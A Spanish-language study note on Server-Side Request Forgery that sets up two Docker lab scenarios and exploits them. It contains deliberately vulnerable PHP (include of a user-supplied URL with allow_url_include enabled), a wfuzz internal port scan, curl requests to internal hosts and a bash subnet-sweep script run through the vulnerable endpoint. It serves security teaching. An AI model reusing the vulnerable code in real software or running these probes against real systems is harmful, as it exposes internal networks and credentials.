-----
- Tags: #SSRF #web #vulnerabilidades 
--------
# Definición

> El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad de seguridad en la que un atacante **puede forzar a un servidor web para que realice solicitudes HTTP en su nombre**.

En un ataque de SSRF, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para **enviar una solicitud HTTP a un servidor web**. El atacante **manipula la solicitud** para que se dirija a un servidor vulnerable o a una red interna a la que **el servidor web tiene acceso** pero el atacante externamente no.

El ataque de SSRF puede permitir al atacante acceder a **información confidencial**, como contraseñas, claves de API y otros datos sensibles, y también puede llegar a permitir al atacante (en función del escenario) **ejecutar comandos en el servidor web** o en otros servidores en la red interna.

Una de las diferencias clave entre el **SSRF** y el **CSRF** es que el SSRF se ejecuta en el servidor web en lugar del navegador del usuario. El atacante **no necesita engañar a un usuario legítimo para hacer clic en un enlace malicioso, ya que puede enviar la solicitud HTTP directamente al servidor web desde una fuente externa**.

Para prevenir los ataques de SSRF, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario y limiten el acceso del servidor web a los recursos de la red interna. Además, los servidores web deben ser configurados para limitar el acceso a los recursos sensibles y restringir el acceso de los usuarios no autorizados.

----
# Creando Laboratorios y Explotándolos con SSRF

## Explicación del primer escenario

Este escenario constará de una **máquina atacante** y una **máquina victima**.

En la máquina victima habrá **dos entornos**, uno será el entorno de **PRODUCCIÓN** (PRO) que estará expuesto hacia nosotros como atacantes (*Puerto 80*), y el otro será el entorno de **PRE PRODUCCIÓN** (PRE) que será accesible únicamente desde el **interior** de la máquina victima (*Puerto 8089*), esto quiere decir que como atacantes **no veremos ni podremos acceder** al entorno *PRE* desde fuera, inclusive utilizando herramientas de escaneo no será posible.

![[SSRF 1.png]]

Los entornos de **PRE PRODUCCIÓN** se suelen utilizar para realizar testeos, validaciones, configuraciones y demás dentro de una Web o servicio antes de ser lanzado al público en un entorno de **PRODUCCIÓN**, esto sería parecido a una **DEMO**. En estos entornos PRE los desarrolladores pueden cometer el error de dejar **credenciales válidas**, o anotaciones que **puedan comprometer la seguridad** de la web en producción o inclusive de los usuarios que la utilicen.

En este escenario nosotros vamos a **configurar una funcionalidad** a través de la cual con un parámetro ``?url=`` le podamos pasar una dirección *URL* y el servidor víctima sea el que haga la petición hacia esa URL, mostrándonos la respuesta en la propia página. Por ejemplo hacer ``?url=google.com`` y que nos muestre el contenido de la web de Google en la web de la victima.

------
### Escenario uno

Comenzaremos **creando nuestro contenedor** para poder tener todo el laboratorio bien estructurado.

- ``docker pull ubuntu:latest``

En este caso no usaremos *Port Forwarding* porque utilizaremos las IP por default del contenedor, recordemos que nuestra IP base es la **docker0** la cual es **172.17.0.1**, por lo tanto el próximo contenedor que creemos tendrá la **172.17.02**. Como nosotros nos encontramos dentro de la **misma interfaz de red** por estar en la docker0, tenemos traza y conectividad contra esta IP del contenedor que está en otra Subred [[Conceptos básicos de Network]].

- ``docker run -dit --name ssrf_first_lab ubuntu``
- ``docker exec -it ssrf_first_lab bash``

Ya dentro del contenedor hacemos lo de siempre ``apt update`` y luego ``apt install nano php apache2 python3 lsof`` que son utilidades que vamos a estar utilizando.

- ``service apache2 start``

Con todo esto hecho si nos dirigimos a http://172.17.0.2:80 apareceremos en la **web base de apache2** con su index.php pre-definido.

Ahora lo que debemos hacer es ir a */var/www/html* y borrar el archivo *index.php*, para luego crear un archivo llamado *utility.php* que contendrá el código de la utilidad que nos permitirá llamar al parámetro ``?url=``.

```php
<?php
	if(isset($_GET['url'])){ // Para validar si nosotros como usuario colocamos el parametro "url" con un valor cargado, podemos utilizar la función "isset()" dentro de un condicional
		$url = $_GET['url']; // Creamos la variable $url para que se almacene el valor que colocamos en el parametro
		echo "\n[+] Listando el contenido de la web " . $url . ":\n\n"; // Concatenamos con el "." en PHP
		include($url); // include(); para que muestre el contenido de la web que proporcionemos
	} else {
		echo "\n[!] No se ha proporcionado ningun valor para el parametro URL\n\n";
	}
?>
```

Es importante que activemos el **allow_url_include** que se encuentra dentro del archivo *php.ini*, que lo debemos buscar con ``find / -name php.ini 2>/dev/null``, en mi caso está en la ruta */etc/php/8.3/apache2/php.ini*, luego hacemos un reset de apache con ``service apache2 restart``

Hecho todo esto si nos vamos a la web http://172.17.0.2:80 nuevamente, veremos el archivo *utility.php*, por lo tanto ingresamos en el, es ahora cuando debemos colocar en la url el parámetro ``?url=https://example.com``

![[SSRF 2.png]]

![[SSRF 3.png]]

Al chequear esto iremos al contenedor y crearemos en el directorio **/var/www/html** un archivito llamado *loginPRO.html* donde contendrá el código de **un panel de login** que podemos buscar por internet. (Buscar *Login HTML sample code*). Una vez que abramos el archivo desde la web y veamos el panel de login que hayamos escogido, editaremos el archivo *loginPRO.html* y añadiremos en algún lugar visible la cadena "*(PRO)*" para identificar que esta web es la de **PRODUCCIÓN**.

Ahora cuando entremos al panel de **Login**, se verá de esta manera

![[SSRF 4.png]]

-------

Para poder crear el entorno **PRE**, simplemente copiamos el archivo *loginPRO.html* en el directorio */tmp/* y lo renombramos a *loginPRE.html* para diferenciarlos. También ingresaremos al archivo *loginPRE* y **agregaremos una linea** mas por encima de *Username* que diga lo siguiente ``<label for="username">// Testear con las credenciales administrator:adm1n@13_2023 (Mismas que las de PRO) </label>``.
Ahora abrimos un servidor con Python *puerto 4646* con ``python3 -m http.server 4646`` estando en el directorio */tmp/*, si nos dirigimos a la web http://172.17.0.2:4646/login.html veremos el *Login de PRE PRODUCCIÓN* porque lo estamos exponiendo con el servidor Python.

![[SSRF 5.png]]

Esto que hicimos en el panel de **Login PRE** es algo que puede utilizar algún desarrollador, no es lo ideal, pero se le puede olvidar o confiar en que nadie verá esos datos.

------

Si en vez de abrir el **servidor Python** como lo hicimos recién, lo hacemos de esta manera ``python3 -m http.server 4646 --bind 127.0.0.1`` **no podremos ver el Login de PRE PRODUCCIÓN** por nuestra web como lo hicimos recién, porque el entorno de **PRE PRODUCCIÓN** será visible únicamente desde el *Host Local*, el cual es el contenedor *172.17.0.2* y nosotros al ingresar a http://172.17.0.2:4646/login.html lo estamos haciendo desde nuestra *172.17.0.1* la *docker0*.

La única forma de ver el servicio de *PRE PRODUCCIÓN* que corre por el *puerto 4646* es que **desde la propia máquina se ingrese a ese servicio como tal**, ya que externamente nosotros lo veremos ==CERRADO==, podemos verificarlo con ``nmap``.

![[SSRF 6.png]]

------
### Explotando SSRF

Nosotros únicamente vemos el entorno de **PRODUCCIÓN** que corre por el *puerto 80*, nuestro trabajo como atacante será encontrar algún tipo de **utilidad** o **panel** vulnerable dentro de la web que nos permita colocar dominios y que nos cargue su contenido. 

Supongamos que estábamos enumerando y de golpe nos encontramos con esa "utilidad" que creamos al principio cuando testeamos con "http://google.com", la cual se encuentra en http://172.17.0.2.
Si nosotros colocamos una **URL** como ``?url=http://google.com`` y enviamos la petición, es el servidor *172.17.0.2* el que la está enviando, por lo tanto podríamos apuntar a **servicios internos** que **no estén expuestos hacia el exterior** pero **que si se puedan ver internamente**. 
Un ejemplo claro para que se entienda mejor es que si hacemos un http://172.17.0.2/utility.php?url=http://127.0.0.1 estamos haciendo que **LA MÁQUINA SE APUNTE A ELLA MISMA** porque ese *127.0.0.1 (localhost)* siendo ejecutado por la máquina corresponde a la máquina misma.

Con todo esto que hicimos, podríamos ir enumerando (como si no supiéramos) cada puerto existente para ver si **detectamos algún puerto interno abierto** en http://172.17.0.2/utility.php?url=http://127.0.0.1 haciendo **Fuzzing** con alguna herramienta.

- ``wfuzz -c -t 50 --hl=3 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"``

![[SSRF 7.png]]

De esta forma al descubrir que el *puerto 4646* está **abierto de manera interna**, si nos dirigimos a el veremos el contenido de la web, en nuestro caso la web de **PRE PRODUCCIÓN**.

==DATO A TENER EN CUENTA, NECESITAMOS ESPECIFICAR SIEMPRE LA WEB CON EL NOMBRE DEL ARCHIVO EXACTO QUE QUERAMOS VER, PORQUE DE LO CONTRARIO NOS DIRÁ QUE EL SERVIDOR ESTÁ CERRADO PORQUE AL HACER CLICK ES NUESTRA IP LA QUE VA HACIA ESE RECURSO Y NOSOTROS QUEREMOS IR COMO SI FUESEMOS LA MÁQUINA VULNERADA==.

![[SSRF 8.png]]

![[SSRF 9.png]]

## Explicación del segundo escenario

Este escenario constará de una **máquina atacante**, y **dos máquinas víctimas**.

- En la primer máquina víctima **estará expuesto un servicio web** con un entorno de **PRODUCCIÓN** por el *puerto 80*, esta máquina además de pertenecer a la subred *172.17.0.0/16* también pertenece a la subred interna *10.10.0.2*, por lo tanto **nosotros como Atacantes no podremos llegar a la 10.10.0.2**, solo será accesible si formamos parte de la red interna. ==LAS IPS DEBEN ESTAR DENTRO DE UNA MISMA SUBRED PARA COMUNICARSE ENTRE SI==

- En la segunda máquina victima **estará un servicio web** con un entorno de **PRE PRODUCCIÓN** dentro de la subred interna *10.10.0.2* por el *puerto 8089*.

Recordemos que, **como atacantes**, estamos dentro de la interfaz de red _docker0_ con la IP _172.17.0.1_. Desde aquí, tenemos conectividad con la IP _172.17.0.2_ porque ambas están en la misma subred (_172.17.0.0/16_). Además, la máquina con la IP _172.17.0.2_ tiene conexión con la IP _10.10.0.3_, ya que ambas pertenecen a la subred _10.10.0.0/24_. Sin embargo, desde nuestra posición como atacantes en la subred _172.17.0.0/16_, no tendremos acceso directo a la IP _10.10.0.3_, a menos que exista un enrutamiento específico que permita la comunicación entre subredes, como sucede en el caso de la máquina _172.17.0.2_.

Para entender esto imaginemos que somos usuarios que acceden a una página web. Esta web está alojada en un servidor web que está en **producción**, ubicado dentro de una máquina en una empresa. Además, existe otra máquina dentro de la misma empresa donde está almacenada una versión del servidor web en **preproducción** (servidor de prueba). Esta versión en preproducción solo es accesible si estás dentro de la subred a la que pertenece la máquina con el servidor web en producción. Si nosotros como usuarios quisiéramos llegar a la web en preproducción, no podríamos ya que para eso deberíamos estár dentro de la misma subred.

![[SSRF 10.png]]

En este caso nuestro objetivo como Atacantes es vulnerar la primer máquina para luego realizar una enumeración para detectar otras subredes, encontrar la subred 10.10.0.2 y buscar dispositivos vinculados a ellos para encontrar la segunda máquina donde está el servidor web en Preproducción.
### Escenario dos

Comenzaremos con la utilización de *docker* para crear el laboratorio, en este caso crearemos tres contenedores, uno que represente la **máquina atacante (ATTACKER)**, otro que represente a la **máquina con el servidor en Producción (PRO)** y por ultimo otro contenedor que represente a la **máquina con el servidor en Preproducción (PRE)**

- ``docker pull ubuntu:latest``

----
Para crear una nueva red en Docker, podemos utilizar el siguiente comando:

- `docker network create --subnet=<subnet> <nombre_de_red>`

Donde:

- **subnet**: es la dirección IP de la subred de la red que estamos creando. Es importante tener en cuenta que esta dirección IP debe ser única y no debe entrar en conflicto con otras redes o subredes existentes en nuestro sistema.
- **nombre_de_red**: es el nombre que le damos a la red que estamos creando.

Además de los campos mencionados anteriormente, también podemos utilizar la opción ``--driver`` en el comando ``docker network create`` para especificar el controlador de red que deseamos utilizar.

Por ejemplo, si queremos crear una red de tipo “**bridge**“, podemos utilizar el siguiente comando:

- `docker network create --subnet=<subnet> --driver=bridge <nombre_de_red>`

En este caso, estamos utilizando la opción ``--driver=bridge`` para indicar que deseamos crear una red de tipo “**bridge**“. La opción ``--driver`` nos permite especificar el controlador de red que deseamos utilizar, que puede ser “**bridge**“, “**overlay**“, “**macvlan**“, “**ipvlan**” u otro controlador compatible con Docker.

-------
Nosotros haremos lo siguiente

- ``docker network create --subnet=10.10.0.0/24 --driver=bridge network1``

Una vez creemos un contenedor si queremos podemos asociarlo a esta red.

---------
==Creamos el contenedor== con nombre "**PRO**" haciendo referencia a la máquina que tendrá el **servidor web en producción**

- ``docker run -dit --name PRO ubuntu``

Si nosotros nos metemos al contenedor que acabamos de crear y hacemos un ``hostname -I`` veremos que pertenece a la *172.17.0.2*, para asociarle la nueva interfaz de red que hemos creado en el paso anterior, haremos lo siguiente

- ``docker network connect network1 PRO``

Si ahora lo chequeamos veremos que pertenece a la *172.17.0.2* y a la *10.10.0.2*

--------
- ``apt update``
- ``apt install iproute2``

Chequeamos las interfaces con ``ip a``

Es importante saber que a medida que creamos mas redes, se nos van a asignar mas interfaces, por lo tanto si miramos en nuestra máquina virtual con ``ip a`` veremos que nosotros tenemos la *10.10.0.1*.

-----
==Creamos el contenedor== donde estará la máquina "**PRE**", pero a la vez que lo creamos **le asignamos la interfaz de red 'network1'**, para que esa sea la única que posea.

- ``docker run -dit --name PRE --network network1 ubuntu``
- ``docker exec -it PRE bash``
- ``apt update``
- ``apt install iproute2 iputils-ping``

Gracias a todo lo que hicimos si hacemos un ``ip a`` veremos que pertenece únicamente a la *10.10.0.3* y que tiene una sola interfaz de red (aislada a la Loopback).

-----
Nos **meteremos nuevamente** en el contenedor *PRO* y haremos lo siguiente

- ``apt install iputils-ping``
- ``ping -c 1 10.10.0.3``

Por lo tanto si hacemos un ``ping -c 1 172.17.0.2`` enviaremos un paquete y lo recibiremos devuelta, por lo tanto tenemos traza porque **ambas IP'S comparten la misma subred**.

-------
==Creamos el contenedor== donde estará la máquina "**ATTACKER**" con una interfaz de red por defecto, la docker0 *172.17.0.3*
(Esta máquina la creamos porque nosotros desde nuestra **Virtual Box** tenemos conectividad directa a la máquina **PRE** (lo cual no es la idea en nuestro caso) ya que al crear el contenedor de esa máquina, se nos crea en nuestra Virtual Box una interfaz de red que conecta con la de la máquina PRE).

- ``docker run -dit --name ATTACKER ubuntu``
- ``docker exec -it ATTACKER bash``
- ``apt update``
- ``apt install iputils-ping iproute2``

Si intentamos hacer un ping desde la máquina *ATTACKER* a la máquina *PRO* vamos a poder hacerlo, pero si intentamos hacérselo a la máquina *PRE* no tendremos traza por no estár en la misma subred.

--------
Instalamos el servidor web en el contenedor *PRO*

- ``apt install apache2 php nano``
- ``service apache2 start``

Eliminamos el **index.php** de */var/www/html* y creamos un utility.php que tendrá el código

```php
<?php
	include($_GET['url']);
?>
```

Ponemos el *allow_url_include* en **On**, buscando el archivo **php.ini** con ``find`` y editándolo.

- ``service apache2 restart``

Con esto hecho ya tenemos la utilidad para hacer el **SSRF** como lo hicimos en el ==Escenario uno== agregando en la url el ``?url=example.com``

----
Agregaremos el panel de **Login** para la **máquina PRO** y luego para la **máquina PRE** crearemos un archivo a modo de **FLAG** llamado *passwd.txt* (Debemos instalar Python3 y todo lo demás en el contenedor PRE), podemos ponerlo en el directorio que queramos, en mi caso lo colocaremos en */tmp/*. Solo resta abrir un servidor con Python3 ``python3 -m http.server 8089`` e intentar explotar la máquina **PRO**.

Instalaremos ``curl`` en la máquina **ATTACKER** porque haremos la explotación desde la **terminal**.

### Explotando SSRF

Nosotros únicamente vemos la web **PRO** que está expuesta, imaginemos que encontramos una vulnerabilidad en alguna parte de la web que nos permite colocar dominios, en este caso esa utilidad es la utilidad **utility.php** que creamos nosotros, colocamos el parámetro ``?url=`` todo desde la terminal con el uso de ``curl``.

Si hacemos un ``curl http://172.17.0.2/utility.php?url=http://10.10.0.3:8089`` lo que estamos haciendo es aprovechar la máquina *172.17.0.2* con la utilidad para llegar a una máquina que se encuentra en una red interna que no es visible desde fuera cómo *ATTAKER*.

![[SSRF 11.png]]

Ahora solo resta en el ``curl`` agregarle el nombre del archivo de texto *passwd.txt* para ver su contenido.

![[SSRF 12.png]]

==Es complicado así de primeras a través de un SSRF poder hacerte la idea directamente de la topología de la red, mayoritariamente habrá que aplicar un descubrimiento manual.==

Iterar desde `0.0.0.0` hasta `255.255.255.255` en un script bash no es práctico ni recomendable debido a la enorme cantidad de direcciones IP involucradas (4,294,967,296 direcciones). Esto consumiría una cantidad significativa de tiempo y recursos de computación. Sin embargo, si necesitas hacer algo con un rango más manejable, como direcciones en subredes específicas, se podría hacer de la siguiente manera.

Por ejemplo, iterar sobre un rango de direcciones IPv4 en una subred específica, como `10.0.0.0/24`, sería más razonable. Acá te dejo un ejemplo de script bash que itera sobre todas las direcciones en la subred `10.0.0.0/24`

```bash
#!/bin/bash

subnet="10.10.0"  # Cambia la subred según tus necesidades

for i in {1..255}; do
    ip_address="$subnet.$i"
    echo "Procesando $ip_address"
    
    # Realizar la solicitud HTTP usando curl y guardar la respuesta en un archivo temporal
    response=$(curl -s "http://172.17.0.2/utility.php?url=http://$ip_address")
    
    # Verificar si la respuesta contiene "200 OK"
    if [[ "$response" == *"200 OK"* ]]; then
        echo "Contenido de $ip_address:"
        echo "$response"  # Mostrar la respuesta completa
    fi
done
```

